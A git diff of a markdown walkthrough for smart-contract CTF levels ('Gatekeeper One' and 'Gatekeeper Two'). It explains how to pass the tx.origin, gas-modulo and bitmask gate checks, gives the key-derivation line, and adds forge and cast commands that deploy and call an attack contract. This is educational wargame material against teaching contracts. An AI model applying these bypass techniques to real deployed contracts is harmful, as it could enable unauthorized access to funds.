@@ -429,15 +429,16 @@ if the value is 0 means it was updated successfully
 
 2. for gateOne msg.sender shud not be equal to tx.origin which can be easily achieved if we call the function thru a contract that way deployed contract will be msg.sender and our EOA will be tx.origin
 
-3. for gateThree we need to understand the concept of datatype downcasting , upcasting and bitmasking , suppose _gatekey = 0x b1 b2 b3 b4 b5 b6 b7 b8
+3. for gateThree we need to understand the concept of datatype downcasting , upcasting and bitmasking , suppose \_gatekey = 0x b1 b2 b3 b4 b5 b6 b7 b8
    - acc. to first condition 0x b5 b6 b7 b8 = 0x 00 00 b7 b8 which means b5, b6 = 00
    - from second condition we get 0x 00 00 00 00 b5 b6 b7 b8 != 0x b1 b2 b3 b4 b5 b6 b7 b8 which means the four bytes b1, b2, b3, b4 can be anything but 00
    - third condition says that 0x b5 b6 b7 b8 = 0x 00 00 (b7 b8 -> tx.origin)
-   - we know 1 & 0 = 0 , 1 & 1 = 1, we'll use this bitmasking to get the value of _gatekey
+   - we know 1 & 0 = 0 , 1 & 1 = 1, we'll use this bitmasking to get the value of \_gatekey
      ```solidity
      bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF
      ```
 4. for gateTwo we need to pass a value which is multiple of 8191 plus some extra amount to cover gas till that statement , here is the source code
+
 ```solidity
 // SPDX-License-Identifier:MIT
 
@@ -455,7 +456,9 @@ contract AttackGatekeeper {
     }
 }
 ```
+
 5. we'll write a test to get the exact value of extra gas we need to send
+
 ```solidity
 // SPDX-License-Identifier:MIT
 
@@ -485,16 +488,32 @@ contract Testlesson13 is Test {
     }
 }
 ```
-now run the test 
+
+now run the test
+
 ```
 forge test -vvvv --rpc-url $RPC_URL --match-path test/level13test.t.sol
 ```
-   
+
+6. we can see 256 satisfies the conditions, hence we'll deploy the contract
+
+```
+forge create src/level13t.sol:AttackGatekeeper --rpc-url $RPC_URL --private-key $PKEY
+```
+
+7. now call enter() with the arguments
+
+```
+cast send $DEPLOYED_ADDRESS "enter(address _target, uint256 gas)" $LEVEL_ADDRESS 256 --rpc-url $RPC_URL --private-key $PKEY
+```
+
+8. submit the instance, u're done.
+
 ## level14 - Gatekeeper Two
 
 1. to complete this level we need to satisfy three conditions gateOne, gateTwo and gateThree.
 
-2. gateOne for this level is same as Gatekeeper One contract 
+2. gateOne for this level is same as Gatekeeper One contract
 
 3. for gateTwo extcodesize(caller()) shud be equal to zero for that we will write the code inside constructor as extcodesize() doesn't include code deployed at deployment time aka. written inside constructor.
 
